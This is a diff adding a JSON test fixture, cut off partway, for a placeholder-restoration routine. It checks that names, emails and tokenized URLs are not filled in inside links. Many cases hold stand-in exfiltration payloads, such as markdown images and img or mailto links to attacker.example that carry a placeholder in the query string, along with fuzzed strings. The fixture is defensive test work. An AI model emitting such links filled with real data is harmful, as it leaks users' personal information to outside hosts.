@@ -1,0 +1,3831 @@
+{
+ "mapping": {
+  "[PERSON_1]": "Anna Petrova",
+  "[PERSON_2]": "Karen Example",
+  "[EMAIL_1]": "anna@example.org",
+  "[URL_WITH_TOKEN_1]": "https://intranet.example/doc?token=abc",
+  "[LITERAL_1]": "[PERSON_1]"
+ },
+ "cases": [
+  {
+   "text": "Dear [PERSON_1], we wrote to [EMAIL_1].",
+   "restored": "Dear Anna Petrova, we wrote to anna@example.org.",
+   "unresolved": []
+  },
+  {
+   "text": "[person_1] and [Person-2] and [PERSON 1]",
+   "restored": "Anna Petrova and Karen Example and Anna Petrova",
+   "unresolved": []
+  },
+  {
+   "text": "PERSON_1 and PERSON 2 and person_1 and Person_1",
+   "restored": "Anna Petrova and Karen Example and person_1 and Person_1",
+   "unresolved": []
+  },
+  {
+   "text": "PERSON_1x xPERSON_1 [PERSON_1]PERSON_2 PERSON_1２",
+   "restored": "PERSON_1x xPERSON_1 Anna PetrovaPERSON_2 PERSON_1２",
+   "unresolved": []
+  },
+  {
+   "text": "[PERSON_01] [PERSON_3] [EMAIL_9] [LITERAL_1] [LITERAL_2]",
+   "restored": "[PERSON_01] [PERSON_3] [EMAIL_9] [PERSON_1] [LITERAL_2]",
+   "unresolved": [
+    [
+     "[PERSON_01]",
+     "not_in_mapping"
+    ],
+    [
+     "[PERSON_3]",
+     "not_in_mapping"
+    ],
+    [
+     "[EMAIL_9]",
+     "not_in_mapping"
+    ],
+    [
+     "[LITERAL_2]",
+     "not_in_mapping"
+    ]
+   ]
+  },
+  {
+   "text": "LITERAL_1 restores what the user typed: [LITERAL_1].",
+   "restored": "[PERSON_1] restores what the user typed: [PERSON_1].",
+   "unresolved": []
+  },
+  {
+   "text": "[URL_WITH_TOKEN_1][EMAIL_1]",
+   "restored": "https://intranet.example/doc?token=abc[EMAIL_1]",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "Kein Treffer: [PERSONA_1] [PERSON_1234567] [PERSON-1-2]",
+   "restored": "Kein Treffer: [PERSONA_1] [PERSON_1234567] [PERSON-1-2]",
+   "unresolved": []
+  },
+  {
+   "text": "Անի [PERSON_1]։ PERSON_2։",
+   "restored": "Անի Anna Petrova։ Karen Example։",
+   "unresolved": []
+  },
+  {
+   "text": "PERSON_1́ ²PERSON_1 PERSON_1٣ ١PERSON_2 _PERSON_1",
+   "restored": "Anna Petrová ²PERSON_1 PERSON_1٣ ١PERSON_2 _PERSON_1",
+   "unresolved": []
+  },
+  {
+   "text": "https://x.example/[PERSON_1] https://x.example/﻿[PERSON_1]",
+   "restored": "https://x.example/Anna Petrova https://x.example/﻿[PERSON_1]",
+   "unresolved": [
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "https://x.example/\u001c[PERSON_1] https://x.example/　[PERSON_2]",
+   "restored": "https://x.example/\u001cAnna Petrova https://x.example/　Karen Example",
+   "unresolved": []
+  },
+  {
+   "text": "𝐀www.[PERSON_1] 😀www.[PERSON_2]",
+   "restored": "𝐀www.Anna Petrova 😀www.[PERSON_2]",
+   "unresolved": [
+    [
+     "[PERSON_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "Done. ![s](https://attacker.example/p.png?d=[EMAIL_1])",
+   "restored": "Done. ![s](https://attacker.example/p.png?d=[EMAIL_1])",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "Done. ![s](https://attacker.example/p.png?d=EMAIL_1)",
+   "restored": "Done. ![s](https://attacker.example/p.png?d=EMAIL_1)",
+   "unresolved": [
+    [
+     "EMAIL_1",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "Done. ![s](https://attacker.example/p.png?d=[email-1])",
+   "restored": "Done. ![s](https://attacker.example/p.png?d=[email-1])",
+   "unresolved": [
+    [
+     "[email-1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[click](https://attacker.example/?d=EMAIL 1)",
+   "restored": "[click](https://attacker.example/?d=EMAIL 1)",
+   "unresolved": [
+    [
+     "EMAIL 1",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[x](/relative/p.png?d=[EMAIL_1])",
+   "restored": "[x](/relative/p.png?d=[EMAIL_1])",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[x](//attacker.example/p.png?d=[EMAIL_1])",
+   "restored": "[x](//attacker.example/p.png?d=[EMAIL_1])",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[x](<https://attacker.example/a b?d=[EMAIL_1]>)",
+   "restored": "[x](<https://attacker.example/a b?d=[EMAIL_1]>)",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[x](https://attacker.example/(p)?d=[EMAIL_1])",
+   "restored": "[x](https://attacker.example/(p)?d=[EMAIL_1])",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[x](/a/((b)?d=[EMAIL_1])",
+   "restored": "[x](/a/((b)?d=[EMAIL_1])",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "![s](\n/p.png?d=[EMAIL_1])",
+   "restored": "![s](\n/p.png?d=[EMAIL_1])",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "![s]([EMAIL_1])",
+   "restored": "![s]([EMAIL_1])",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "see https://attacker.example/?d=[EMAIL_1] now",
+   "restored": "see https://attacker.example/?d=[EMAIL_1] now",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "see https://attacker.example/?d=EMAIL_1",
+   "restored": "see https://attacker.example/?d=EMAIL_1",
+   "unresolved": [
+    [
+     "EMAIL_1",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "see ftp://attacker.example/[EMAIL_1]",
+   "restored": "see ftp://attacker.example/[EMAIL_1]",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "see //attacker.example/?d=[EMAIL_1]",
+   "restored": "see //attacker.example/?d=[EMAIL_1]",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "visit www.attacker.example/?d=[EMAIL_1]",
+   "restored": "visit www.attacker.example/?d=[EMAIL_1]",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "<https://attacker.example/?d=[EMAIL_1]>",
+   "restored": "<https://attacker.example/?d=[EMAIL_1]>",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "<mailto:x@attacker.example?body=[EMAIL_1]>",
+   "restored": "<mailto:x@attacker.example?body=[EMAIL_1]>",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "<img src=\"https://attacker.example/?d=[EMAIL_1]\">",
+   "restored": "<img src=\"https://attacker.example/?d=[EMAIL_1]\">",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "<img src='/p.png?d=[EMAIL_1]'>",
+   "restored": "<img src='/p.png?d=[EMAIL_1]'>",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "<img\nalt=\"x\"\nsrc=\"/p.png?d=[EMAIL_1]\">",
+   "restored": "<img\nalt=\"x\"\nsrc=\"/p.png?d=[EMAIL_1]\">",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "<a href=/x?d=[EMAIL_1]>x</a>",
+   "restored": "<a href=/x?d=[EMAIL_1]>x</a>",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "<form action = \"/x?d=[EMAIL_1]\">",
+   "restored": "<form action = \"/x?d=[EMAIL_1]\">",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "<img srcset=\"a.png 1x, /b.png?d=[EMAIL_1] 2x\">",
+   "restored": "<img srcset=\"a.png 1x, /b.png?d=[EMAIL_1] 2x\">",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "<video poster=\"/p.png?d=EMAIL_1\">",
+   "restored": "<video poster=\"/p.png?d=EMAIL_1\">",
+   "unresolved": [
+    [
+     "EMAIL_1",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "<div style=\"background: url(/p.png?d=[EMAIL_1])\">",
+   "restored": "<div style=\"background: url(/p.png?d=[EMAIL_1])\">",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[1]: /p.png?d=[EMAIL_1]\n\n![s][1]",
+   "restored": "[1]: /p.png?d=[EMAIL_1]\n\n![s][1]",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "  [1]:\n  <//attacker.example/?d=[EMAIL_1]>\n\n![s][1]",
+   "restored": "  [1]:\n  <//attacker.example/?d=[EMAIL_1]>\n\n![s][1]",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[EMAIL_1] ![s](https://attacker.example/?d=[EMAIL_1]) [PERSON_9]",
+   "restored": "anna@example.org ![s](https://attacker.example/?d=[EMAIL_1]) [PERSON_9]",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ],
+    [
+     "[PERSON_9]",
+     "not_in_mapping"
+    ]
+   ]
+  },
+  {
+   "text": "Write to [EMAIL_1] (see https://example.org/help).",
+   "restored": "Write to anna@example.org (see https://example.org/help).",
+   "unresolved": []
+  },
+  {
+   "text": "See https://example.org/x [EMAIL_1]",
+   "restored": "See https://example.org/x anna@example.org",
+   "unresolved": []
+  },
+  {
+   "text": "[PERSON_1](https://example.org) wrote",
+   "restored": "Anna Petrova(https://example.org) wrote",
+   "unresolved": []
+  },
+  {
+   "text": "See [docs](https://example.org/x). Ask [PERSON_1].",
+   "restored": "See [docs](https://example.org/x). Ask Anna Petrova.",
+   "unresolved": []
+  },
+  {
+   "text": "A [link](/a(b)c) then [PERSON_1]",
+   "restored": "A [link](/a(b)c) then Anna Petrova",
+   "unresolved": []
+  },
+  {
+   "text": "<p title=\"x\">[PERSON_1]</p>",
+   "restored": "<p title=\"x\">Anna Petrova</p>",
+   "unresolved": []
+  },
+  {
+   "text": "<em>[PERSON_1]</em> wrote",
+   "restored": "<em>Anna Petrova</em> wrote",
+   "unresolved": []
+  },
+  {
+   "text": "if a < b then [PERSON_1] wins",
+   "restored": "if a < b then Anna Petrova wins",
+   "unresolved": []
+  },
+  {
+   "text": "x<y, z=[PERSON_1]",
+   "restored": "x<y, z=Anna Petrova",
+   "unresolved": []
+  },
+  {
+   "text": "TODO // [PERSON_1]",
+   "restored": "TODO // Anna Petrova",
+   "unresolved": []
+  },
+  {
+   "text": "[PERSON_1]: I agree with [EMAIL_1].",
+   "restored": "Anna Petrova: I agree with anna@example.org.",
+   "unresolved": []
+  },
+  {
+   "text": "Broken [link](\n\nthen [PERSON_1]",
+   "restored": "Broken [link](\n\nthen Anna Petrova",
+   "unresolved": []
+  },
+  {
+   "text": "<img src=\"/p.png\">\n[EMAIL_1]",
+   "restored": "<img src=\"/p.png\">\nanna@example.org",
+   "unresolved": []
+  },
+  {
+   "text": "email=[EMAIL_1] in code",
+   "restored": "email=anna@example.org in code",
+   "unresolved": []
+  },
+  {
+   "text": "awww.[PERSON_1]",
+   "restored": "awww.Anna Petrova",
+   "unresolved": []
+  },
+  {
+   "text": "éwww.[PERSON_1] 1www.[PERSON_2] -www.[PERSON_2]",
+   "restored": "éwww.Anna Petrova 1www.Karen Example -www.[PERSON_2]",
+   "unresolved": [
+    [
+     "[PERSON_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[URL_WITH_TOKEN_1]=PERSON 2[person-1]]EMAIL_1",
+   "restored": "https://intranet.example/doc?token=abc=PERSON 2Anna Petrova]EMAIL_1",
+   "unresolved": []
+  },
+  {
+   "text": ".PERSON 2_![a]PERSON_1[EMAIL_1]",
+   "restored": ".PERSON 2_![a]PERSON_1anna@example.org",
+   "unresolved": []
+  },
+  {
+   "text": "\n[person-1]https://[EMAIL_1]2\n\nPERSON 2",
+   "restored": "\nAnna Petrovahttps://[EMAIL_1]2\n\nKaren Example",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "PERSON[EMAIL_2][1]:.PERSON 2PERSON.=PERSON 2[1]:PERSON_12[LITERAL_1]<a href=",
+   "restored": "PERSON[EMAIL_2][1]:.PERSON 2PERSON.=PERSON 2[1]:PERSON_12[PERSON_1]<a href=",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "not_in_mapping"
+    ]
+   ]
+  },
+  {
+   "text": "[URL_WITH_TOKEN_1]][EMAIL_2]PERSON<img src='2)",
+   "restored": "https://intranet.example/doc?token=abc][EMAIL_2]PERSON<img src='2)",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": ".PERSON",
+   "restored": ".PERSON",
+   "unresolved": []
+  },
+  {
+   "text": "(<EMAIL_12[person-1]PERSONPERSON 2![a]é]\n\n",
+   "restored": "(<EMAIL_12Anna PetrovaPERSONPERSON 2![a]é]\n\n",
+   "unresolved": []
+  },
+  {
+   "text": "<https:  .  <<img src='https://)https://[EMAIL_1]PERSON<img src='[",
+   "restored": "<https:  .  <<img src='https://)https://[EMAIL_1]PERSON<img src='[",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "\" <a href=[person-1][EMAIL_2]_\n](",
+   "restored": "\" <a href=[person-1][EMAIL_2]_\n](",
+   "unresolved": [
+    [
+     "[person-1]",
+     "inside_link"
+    ],
+    [
+     "[EMAIL_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "\"[URL_WITH_TOKEN_1]é\nPERSON_1[person-1]2PERSON<https:\"'é.",
+   "restored": "\"https://intranet.example/doc?token=abcé\nPERSON_1Anna Petrova2PERSON<https:\"'é.",
+   "unresolved": []
+  },
+  {
+   "text": "  [person-1][EMAIL_1]www.x[person-1]PERSON 2<img src='PERSON <a href=>'",
+   "restored": "  Anna Petrovaanna@example.orgwww.xAnna PetrovaPERSON 2<img src='PERSON <a href=>'",
+   "unresolved": []
+  },
+  {
+   "text": "  ",
+   "restored": "  ",
+   "unresolved": []
+  },
+  {
+   "text": "]([EMAIL_2]éPERSON 2![a]<a href=",
+   "restored": "]([EMAIL_2]éPERSON 2![a]<a href=",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "https://==",
+   "restored": "https://==",
+   "unresolved": []
+  },
+  {
+   "text": "é[EMAIL_1]]( =2www.[LITERAL_1]\n\n2www.\n'>",
+   "restored": "éanna@example.org]( =2www.[LITERAL_1]\n\n2www.\n'>",
+   "unresolved": [
+    [
+     "[LITERAL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[URL_WITH_TOKEN_1][EMAIL_1])[URL_WITH_TOKEN_1]",
+   "restored": "https://intranet.example/doc?token=abc[EMAIL_1])[URL_WITH_TOKEN_1]",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ],
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[1]:[PERSON_1]é.",
+   "restored": "[1]:[PERSON_1]é.",
+   "unresolved": [
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "//<a href=[PERSON_1]",
+   "restored": "//<a href=[PERSON_1]",
+   "unresolved": [
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "\n]<",
+   "restored": "\n]<",
+   "unresolved": []
+  },
+  {
+   "text": "PERSON<https:[LITERAL_1]_PERSON 2  2===",
+   "restored": "PERSON<https:[LITERAL_1]_PERSON 2  2===",
+   "unresolved": [
+    [
+     "[LITERAL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "EMAIL_1x=PERSON 2([person-1]![a]",
+   "restored": "EMAIL_1x=Karen Example(Anna Petrova![a]",
+   "unresolved": []
+  },
+  {
+   "text": "]([EMAIL_2]\"PERSON 2EMAIL_1[PERSON_1]PERSON[URL_WITH_TOKEN_1]",
+   "restored": "]([EMAIL_2]\"PERSON 2EMAIL_1[PERSON_1]PERSON[URL_WITH_TOKEN_1]",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "inside_link"
+    ],
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ],
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "EMAIL_1<[PERSON_2][person-1]![a]>[URL_WITH_TOKEN_1]//'",
+   "restored": "anna@example.org<Karen ExampleAnna Petrova![a]>https://intranet.example/doc?token=abc//'",
+   "unresolved": []
+  },
+  {
+   "text": "<x[EMAIL_2][EMAIL_2]é  xx<img src='[EMAIL_1]",
+   "restored": "<x[EMAIL_2][EMAIL_2]é  xx<img src='[EMAIL_1]",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "not_in_mapping"
+    ],
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "EMAIL_1\"//",
+   "restored": "anna@example.org\"//",
+   "unresolved": []
+  },
+  {
+   "text": "]([[PERSON_2]![a][<[URL_WITH_TOKEN_1]]",
+   "restored": "]([[PERSON_2]![a][<[URL_WITH_TOKEN_1]]",
+   "unresolved": [
+    [
+     "[PERSON_2]",
+     "inside_link"
+    ],
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[",
+   "restored": "[",
+   "unresolved": []
+  },
+  {
+   "text": "[EMAIL_1]//[<](",
+   "restored": "anna@example.org//[<](",
+   "unresolved": []
+  },
+  {
+   "text": "[1]:]]_\"[1]:",
+   "restored": "[1]:]]_\"[1]:",
+   "unresolved": []
+  },
+  {
+   "text": "(https://=[1]:([é'[PERSON_2][PERSON_2]",
+   "restored": "(https://=[1]:([é'[PERSON_2][PERSON_2]",
+   "unresolved": [
+    [
+     "[PERSON_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "www.x//(' '<[EMAIL_1][1]:EMAIL_1[1]:x",
+   "restored": "www.x//(' '<anna@example.org[1]:EMAIL_1[1]:x",
+   "unresolved": []
+  },
+  {
+   "text": "\"![a]x[PERSON_1]",
+   "restored": "\"![a]xAnna Petrova",
+   "unresolved": []
+  },
+  {
+   "text": "'[EMAIL_1][EMAIL_2]>(x)\n\n",
+   "restored": "'anna@example.org[EMAIL_2]>(x)\n\n",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "not_in_mapping"
+    ]
+   ]
+  },
+  {
+   "text": "\"[EMAIL_1]=  =[EMAIL_1]](]([LITERAL_1][PERSON_2][URL_WITH_TOKEN_1].  ",
+   "restored": "\"anna@example.org=  =anna@example.org](]([LITERAL_1][PERSON_2][URL_WITH_TOKEN_1].  ",
+   "unresolved": [
+    [
+     "[LITERAL_1]",
+     "inside_link"
+    ],
+    [
+     "[PERSON_2]",
+     "inside_link"
+    ],
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[URL_WITH_TOKEN_1]x'[URL_WITH_TOKEN_1]22[LITERAL_1][PERSON_2][PERSON_1]EMAIL_1[[LITERAL_1]\n\n",
+   "restored": "https://intranet.example/doc?token=abcx'[URL_WITH_TOKEN_1]22[LITERAL_1][PERSON_2][PERSON_1]EMAIL_1[[LITERAL_1]\n\n",
+   "unresolved": [
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ],
+    [
+     "[LITERAL_1]",
+     "inside_link"
+    ],
+    [
+     "[PERSON_2]",
+     "inside_link"
+    ],
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "(![a][PERSON_2]//![a]<a href=_https://.<https://]\n[LITERAL_1]",
+   "restored": "(![a]Karen Example//![a]<a href=_https://.<https://]\n[PERSON_1]",
+   "unresolved": []
+  },
+  {
+   "text": "'",
+   "restored": "'",
+   "unresolved": []
+  },
+  {
+   "text": ".[\n_[LITERAL_1]][URL_WITH_TOKEN_1][",
+   "restored": ".[\n_[PERSON_1]]https://intranet.example/doc?token=abc[",
+   "unresolved": []
+  },
+  {
+   "text": "[PERSON_2] )[PERSON_1][URL_WITH_TOKEN_1])[URL_WITH_TOKEN_1]x[EMAIL_2]",
+   "restored": "Karen Example )Anna Petrovahttps://intranet.example/doc?token=abc)[URL_WITH_TOKEN_1]x[EMAIL_2]",
+   "unresolved": [
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ],
+    [
+     "[EMAIL_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "PERSON 2<https:[[2xEMAIL_12PERSON 2",
+   "restored": "Karen Example<https:[[2xEMAIL_12PERSON 2",
+   "unresolved": []
+  },
+  {
+   "text": "(www.PERSON_1EMAIL_1",
+   "restored": "(www.PERSON_1EMAIL_1",
+   "unresolved": []
+  },
+  {
+   "text": " 2[PERSON_2][person-1] <https:__(",
+   "restored": " 2Karen ExampleAnna Petrova <https:__(",
+   "unresolved": []
+  },
+  {
+   "text": "www. _]x_https://[//2( ",
+   "restored": "www. _]x_https://[//2( ",
+   "unresolved": []
+  },
+  {
+   "text": "\n[EMAIL_2]=",
+   "restored": "\n[EMAIL_2]=",
+   "unresolved": [
+    [
+     "[EMAIL_2]",
+     "not_in_mapping"
+    ]
+   ]
+  },
+  {
+   "text": "<https:[person-1]https://\n\n[person-1]![a]<img src='[EMAIL_2]",
+   "restored": "<https:[person-1]https://\n\nAnna Petrova![a]<img src='[EMAIL_2]",
+   "unresolved": [
+    [
+     "[person-1]",
+     "inside_link"
+    ],
+    [
+     "[EMAIL_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[URL_WITH_TOKEN_1]<[URL_WITH_TOKEN_1]//[LITERAL_1]  [1]:EMAIL_1=é]([1]:](",
+   "restored": "https://intranet.example/doc?token=abc<[URL_WITH_TOKEN_1]//[LITERAL_1]  [1]:anna@example.org=é]([1]:](",
+   "unresolved": [
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ],
+    [
+     "[LITERAL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "\n\n_=\"\n('<https:[EMAIL_1]<[PERSON_2]\"",
+   "restored": "\n\n_=\"\n('<https:[EMAIL_1]<[PERSON_2]\"",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ],
+    [
+     "[PERSON_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "   [PERSON_2]>\"[<a href=_[person-1]",
+   "restored": "   Karen Example>\"[<a href=_[person-1]",
+   "unresolved": [
+    [
+     "[person-1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[1]:EMAIL_1",
+   "restored": "[1]:EMAIL_1",
+   "unresolved": [
+    [
+     "EMAIL_1",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "//www.",
+   "restored": "//www.",
+   "unresolved": []
+  },
+  {
+   "text": ")",
+   "restored": ")",
+   "unresolved": []
+  },
+  {
+   "text": "[LITERAL_1]\n\n//=[URL_WITH_TOKEN_1]",
+   "restored": "[PERSON_1]\n\n//=[URL_WITH_TOKEN_1]",
+   "unresolved": [
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "_PERSONé<https:[EMAIL_1]www.PERSON 2)\n\n",
+   "restored": "_PERSONé<https:[EMAIL_1]www.PERSON 2)\n\n",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ],
+    [
+     "PERSON 2",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "www.[PERSON_2]",
+   "restored": "www.[PERSON_2]",
+   "unresolved": [
+    [
+     "[PERSON_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[EMAIL_1]//[EMAIL_1][1]:[person-1]//[EMAIL_2]  [PERSON_1]\"2",
+   "restored": "anna@example.org//[EMAIL_1][1]:[person-1]//[EMAIL_2]  Anna Petrova\"2",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ],
+    [
+     "[person-1]",
+     "inside_link"
+    ],
+    [
+     "[EMAIL_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "www.[LITERAL_1]PERSON_1[https://[EMAIL_2]](",
+   "restored": "www.[LITERAL_1]PERSON_1[https://[EMAIL_2]](",
+   "unresolved": [
+    [
+     "[LITERAL_1]",
+     "inside_link"
+    ],
+    [
+     "[EMAIL_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "PERSON 2)(<img src='<img src='",
+   "restored": "Karen Example)(<img src='<img src='",
+   "unresolved": []
+  },
+  {
+   "text": "![a]<a href= _)www.'[PERSON_2]//",
+   "restored": "![a]<a href= _)www.'[PERSON_2]//",
+   "unresolved": [
+    [
+     "[PERSON_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[PERSON_1]",
+   "restored": "Anna Petrova",
+   "unresolved": []
+  },
+  {
+   "text": "_",
+   "restored": "_",
+   "unresolved": []
+  },
+  {
+   "text": "(_xhttps:// EMAIL_1\n\né]",
+   "restored": "(_xhttps:// anna@example.org\n\né]",
+   "unresolved": []
+  },
+  {
+   "text": "=_<img src='![a][1]:\"([LITERAL_1]='PERSON 2[LITERAL_1][PERSON_1][person-1]",
+   "restored": "=_<img src='![a][1]:\"([LITERAL_1]='PERSON 2[PERSON_1]Anna PetrovaAnna Petrova",
+   "unresolved": [
+    [
+     "[LITERAL_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "//\n\n](PERSON 2[EMAIL_1]>_<a href=https://<a href=PERSON_1",
+   "restored": "//\n\n](PERSON 2[EMAIL_1]>_<a href=https://<a href=PERSON_1",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ],
+    [
+     "PERSON_1",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": ")](www. [PERSON_1]//<\"",
+   "restored": ")](www. [PERSON_1]//<\"",
+   "unresolved": [
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "<https:https://PERSON_1<img src='![a]')[PERSON_1]\"",
+   "restored": "<https:https://PERSON_1<img src='![a]')Anna Petrova\"",
+   "unresolved": [
+    [
+     "PERSON_1",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[EMAIL_1]xwww._(https://_",
+   "restored": "anna@example.orgxwww._(https://_",
+   "unresolved": []
+  },
+  {
+   "text": "[PERSON_1][EMAIL_1]//[EMAIL_1][URL_WITH_TOKEN_1]=.PERSON_1=[PERSON_2]<img src='<img src='[1]:",
+   "restored": "Anna Petrovaanna@example.org//[EMAIL_1][URL_WITH_TOKEN_1]=.PERSON_1=[PERSON_2]<img src='<img src='[1]:",
+   "unresolved": [
+    [
+     "[EMAIL_1]",
+     "inside_link"
+    ],
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ],
+    [
+     "PERSON_1",
+     "inside_link"
+    ],
+    [
+     "[PERSON_2]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": ".[",
+   "restored": ".[",
+   "unresolved": []
+  },
+  {
+   "text": "[URL_WITH_TOKEN_1]><https:é[URL_WITH_TOKEN_1]<a href=[URL_WITH_TOKEN_1]PERSON_1_\n\n_[LITERAL_1][_",
+   "restored": "https://intranet.example/doc?token=abc><https:é[URL_WITH_TOKEN_1]<a href=https://intranet.example/doc?token=abcPERSON_1_\n\n_[PERSON_1][_",
+   "unresolved": [
+    [
+     "[URL_WITH_TOKEN_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
+   "text": "[PERSON_2].[1]:[EMAIL_1][PERSON_2]PERSON_1[LITERAL_1]<EMAIL_1>",
+   "restored": "Karen Example.[1]:anna@example.orgKaren ExamplePERSON_1[PERSON_1]<anna@example.org>",
+   "unresolved": []
+  },
+  {
+   "text": " 2PERSON 2[PERSON_2]]https://é//[PERSON_1]  [person-1]_][EMAIL_1]",
+   "restored": " 2PERSON 2Karen Example]https://é//[PERSON_1]  Anna Petrova_]anna@example.org",
+   "unresolved": [
+    [
+     "[PERSON_1]",
+     "inside_link"
+    ]
+   ]
+  },
+  {
